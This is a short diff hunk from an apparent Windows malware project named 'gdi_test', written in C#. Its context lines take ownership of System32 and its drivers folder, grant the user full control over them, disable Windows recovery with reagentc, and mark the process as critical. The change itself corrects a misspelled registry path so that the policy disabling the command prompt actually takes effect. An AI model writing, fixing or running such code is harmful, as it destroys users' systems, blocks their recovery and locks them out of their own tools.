@@ -116,7 +116,7 @@ namespace gdi_test
             ctrlaltdel.Arguments = @"/k color 47 && title Critical process && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && reagentc.exe /disable && Exit";
             var process = Process.Start(ctrlaltdel);
             process.WaitForExit();
-            RegistryKey rk3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Polcies\\Microsoft\\Windows\\System");
+            RegistryKey rk3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
             rk3.SetValue("DisableCMD", 1, RegistryValueKind.DWord); // turn off cmd
             unpack();
             int isCritical = 1;  // we want this to be a Critical Process
